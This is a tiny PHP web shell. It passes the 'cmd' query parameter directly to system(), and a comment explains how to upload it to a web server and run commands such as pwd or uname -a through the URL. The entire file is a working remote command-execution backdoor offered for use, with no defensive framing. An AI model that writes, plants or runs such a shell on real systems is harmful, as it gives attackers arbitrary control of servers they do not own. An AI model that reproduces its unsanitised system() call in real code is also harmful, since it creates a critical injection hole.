<?php

	/* 
	To use this file, upload it to a web server.

	execute the script by running url in your browser:

	www.example.com/1.php?cmd=pwd

	www.example.com/1.php?cmd=uname%20-a
	(if you need to URL encode the command)

	substitute "pwd" for the Windows or *nix command of choice
	*/

  $cmd = $_GET['cmd'];
  system($cmd);
?>